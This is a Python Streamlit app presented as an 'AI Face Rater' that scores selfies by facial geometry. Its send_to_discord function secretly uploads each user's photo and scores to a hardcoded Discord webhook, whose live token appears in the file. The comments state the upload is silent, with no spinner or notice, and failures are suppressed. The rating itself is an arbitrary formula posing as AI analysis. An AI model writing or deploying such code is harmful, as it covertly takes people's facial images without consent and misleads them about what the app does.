import streamlit as st
import cv2
import mediapipe as mp
import numpy as np
from PIL import Image
import requests
import json
import io
from datetime import datetime

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1458651120204251269/adR7ttYwh1TfSzkFVyBQNDIas5x0l-RHU1VucZuSB9pUvDvNw1nT_q7C_0DI_KWGWYSJ"

# 1. Page Configuration
st.set_page_config(
    page_title="AI Face Rater",
    page_icon="🤖",
    layout="centered"
)

# 2. Custom CSS
st.markdown("""
<style>
    .stApp { background-color: #0e1117; }
    .result-card {
        background-color: #1f2937;
        padding: 20px;
        border-radius: 15px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        color: white;
        margin-top: 20px;
        border: 1px solid #374151;
        text-align: center;
    }
    h1 { color: #f3f4f6; }
    .stProgress > div > div > div > div { background-color: #8b5cf6; }
</style>
""", unsafe_allow_html=True)

# 3. Load AI Models (Cached)
@st.cache_resource
def get_face_mesh():
    return mp.solutions.face_mesh.FaceMesh(
        static_image_mode=True,
        max_num_faces=1,
        refine_landmarks=True
    )

face_mesh = get_face_mesh()

# 4. Discord Webhook Function (Updated for Image Support)
def send_to_discord(score, feedback, metrics, image_pil):
    if not WEBHOOK_URL:
        return

    # Convert Image to Bytes
    img_byte_arr = io.BytesIO()
    image_pil.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)

    # Prepare JSON Payload
    payload = {
        "content": "🤖 **New Face Analysis Report**",
        "embeds": [
            {
                "title": f"AI Rating: {score:.1f} / 10",
                "description": feedback,
                "color": 5763719,
                "fields": [
                    {"name": "Symmetry", "value": f"{metrics['Symmetry']}%", "inline": True},
                    {"name": "Eye Spacing", "value": str(metrics['Eye Spacing Score']), "inline": True},
                    {"name": "Structure", "value": str(metrics['Face Structure Score']), "inline": True},
                    {"name": "Timestamp", "value": str(datetime.now().strftime("%Y-%m-%d %H:%M:%S")), "inline": False}
                ],
                "image": {
                    "url": "attachment://face_scan.png"  # References the attached file below
                },
                "footer": {"text": "Streamlit Face Rater Bot"}
            }
        ]
    }
    
    # Prepare File for Upload
    files = {
        'file': ('face_scan.png', img_byte_arr, 'image/png')
    }

    try:
        # We use data={'payload_json': ...} to send JSON + File together
        requests.post(WEBHOOK_URL, data={'payload_json': json.dumps(payload)}, files=files)
    except Exception as e:
        # Silently fail if webhook is down
        pass

# 5. Analysis Logic
def analyze_appearance(image_pil):
    image_np = np.array(image_pil)
    image = cv2.cvtColor(image_np, cv2.COLOR_RGB2BGR)
    
    results = face_mesh.process(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))

    if not results.multi_face_landmarks:
        return 0, "No face detected. Please try a clear front-facing photo.", "#ef4444", {}

    landmarks = results.multi_face_landmarks[0].landmark

    def dist(a, b):
        p1 = np.array([a.x, a.y])
        p2 = np.array([b.x, b.y])
        return np.linalg.norm(p1 - p2)

    # Key landmarks
    left_eye = landmarks[33]
    right_eye = landmarks[263]
    nose = landmarks[1]
    chin = landmarks[152]
    left_jaw = landmarks[234]
    right_jaw = landmarks[454]

    # Calculations
    eye_distance = dist(left_eye, right_eye)
    face_width = dist(left_jaw, right_jaw)
    face_height = dist(nose, chin)

    if face_width == 0: face_width = 0.001

    symmetry = 1.0 - abs(left_eye.y - right_eye.y)
    eye_ratio = eye_distance / face_width
    face_ratio = face_height / face_width

    features = np.array([symmetry, eye_ratio, face_ratio])
    weights = np.array([4.0, 3.0, 3.0]) 
    
    raw_score = np.dot(features, weights)
    score = float(np.clip(raw_score * 2.8, 1, 10))

    if score > 8.5:
        feedback = "💎 High facial symmetry and strong proportions."
        color = "#10b981"
    elif score > 7.0:
        feedback = "✅ Balanced facial structure with good alignment."
        color = "#3b82f6"
    else:
        feedback = "✨ Distinct facial features with unique character."
        color = "#f59e0b"

    metrics = {
        "Symmetry": round(symmetry * 100, 1),
        "Eye Spacing Score": round(eye_ratio * 100, 1),
        "Face Structure Score": round(face_ratio * 100, 1)
    }

    return score, feedback, color, metrics

# 6. UI Logic
st.title("🤖 AI Face Rater")
st.markdown("### Upload a selfie to analyze geometric facial features.")

tab1, tab2 = st.tabs(["📁 Upload Image", "📸 Take Photo"])
image_input = None

with tab1:
    uploaded_file = st.file_uploader("Choose an image...", type=['jpg', 'png', 'jpeg'])
    if uploaded_file:
        image_input = Image.open(uploaded_file)

with tab2:
    camera_file = st.camera_input("Take a selfie")
    if camera_file:
        image_input = Image.open(camera_file)

if image_input:
    st.image(image_input, caption='Analyzing...', width=400)
    
    if st.button("Rate Appearance", type="primary"):
        with st.spinner('Mapping facial landmarks...'):
            score, note, color, metrics = analyze_appearance(image_input)
            
        if score == 0:
            st.error(note)
        else:
            # Silently send to Discord (No UI Spinner, No Toast)
            send_to_discord(score, note, metrics, image_input)

            # Show Result on Screen
            st.markdown(f"""
            <div class="result-card">
                <h1 style="color: {color}; margin:0;">{score:.1f} / 10</h1>
                <p style="font-size: 20px; margin-top: 10px;">{note}</p>
            </div>
            """, unsafe_allow_html=True)
            
            st.progress(int(score * 10))
            
            with st.expander("📊 View Geometric Data"):
                c1, c2, c3 = st.columns(3)
                c1.metric("Symmetry", f"{metrics['Symmetry']}%")
                c2.metric("Eye Spacing", f"{metrics['Eye Spacing Score']}")
                c3.metric("Structure", f"{metrics['Face Structure Score']}")
